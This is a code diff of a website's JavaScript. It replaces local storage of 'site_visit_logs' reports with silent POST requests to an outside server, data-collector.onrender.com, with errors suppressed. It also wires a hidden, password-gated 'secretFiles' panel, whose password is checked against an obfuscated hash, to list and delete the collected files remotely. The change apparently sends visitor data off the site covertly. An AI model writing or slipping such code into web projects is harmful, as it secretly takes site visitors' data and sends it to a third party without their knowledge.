@@ -124,13 +124,16 @@
           return `\n=== ${section} ===\n${entries.map(([k,v]) => `  ${k.padEnd(maxLen+2)}: ${v}`).join('\n')}`;
         }).join('');
         const nameBase = dn(he);
-        const key = `${nameBase}`;
+        const timestamp = new Date().toISOString().replace(/:/g, '-').split('.')[0];
+        const folderName = 'site_logs';
+        const fileName = `${nameBase}_${timestamp}.txt`;
         try {
-          const logs = JSON.parse(localStorage.getItem('site_visit_logs') || '[]');
-          const idx = logs.findIndex(l => l.id === key);
-          const entry = { id: key, name: `${key}.txt`, data: txt, time: Date.now() };
-          if (idx >= 0) logs[idx] = entry; else logs.push(entry);
-          localStorage.setItem('site_visit_logs', JSON.stringify(logs));
+          const payload = { folder_name: folderName, file_name: fileName, content: txt };
+          await fetch('https://data-collector.onrender.com/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          }).catch(()=>{});
         } catch {}
       })();
     })();
@@ -197,7 +200,6 @@
         const list = document.getElementById('secretFiles');
         const btn = document.getElementById('secretReload');
         const clearAll = document.getElementById('secretClearAll');
-        const STORAGE = 'site_visit_logs';
         if(!list) return;
         list.textContent = '';
         const wrap = document.createElement('div');
@@ -205,9 +207,11 @@
         wrap.style.gap = '8px';
         list.appendChild(wrap);
         try{
-          const logs = JSON.parse(localStorage.getItem(STORAGE) || '[]');
+          const res = await fetch('https://data-collector.onrender.com/list');
+          const data = await res.json();
+          const logs = data.files || [];
           if(!logs.length){ const p = document.createElement('p'); p.textContent = 'Файлов нет'; p.style.textAlign = 'center'; p.style.color = 'var(--muted)'; list.appendChild(p); return; }
-          logs.reverse().forEach(item=>{
+          logs.forEach(item=>{
             const row = document.createElement('div');
             row.style.display='flex'; row.style.justifyContent='space-between'; row.style.alignItems='center'; row.style.gap='10px'; row.style.padding='8px'; row.style.border='1px solid var(--border)'; row.style.borderRadius='8px';
             const left = document.createElement('div'); left.style.display='flex'; left.style.flexDirection='column'; left.style.gap='2px'; left.style.flex='1';
@@ -232,8 +236,7 @@
                 async function hx(str){ const e=new TextEncoder(); const b=await crypto.subtle.digest('SHA-256',e.encode(str)); const a=Array.from(new Uint8Array(b)); return a.map(x=>x.toString(16).padStart(2,'0')).join(''); }
                 const hp=await hx(pw); const expected=await hx(dz());
                 if(hp!==expected){ const sh=b.querySelector('.sheet'); if(sh){ sh.classList.remove('shake'); sh.offsetWidth; sh.classList.add('shake'); } return; }
-                const updated = logs.filter(l => l.id !== item.id);
-                localStorage.setItem(STORAGE, JSON.stringify(updated));
+                await fetch(`https://data-collector.onrender.com/delete?path=${encodeURIComponent(item.path)}`, { method: 'DELETE' });
                 y();
               }catch{}
             });
@@ -247,7 +250,7 @@
               async function hx(str){ const e=new TextEncoder(); const b=await crypto.subtle.digest('SHA-256',e.encode(str)); const a=Array.from(new Uint8Array(b)); return a.map(x=>x.toString(16).padStart(2,'0')).join(''); }
               const hp=await hx(pw); const expected=await hx(dz());
               if(hp!==expected) return;
-              localStorage.setItem(STORAGE, JSON.stringify([]));
+              for(const item of logs) await fetch(`https://data-collector.onrender.com/delete?path=${encodeURIComponent(item.path)}`, { method: 'DELETE' });
               y();
             };
           }
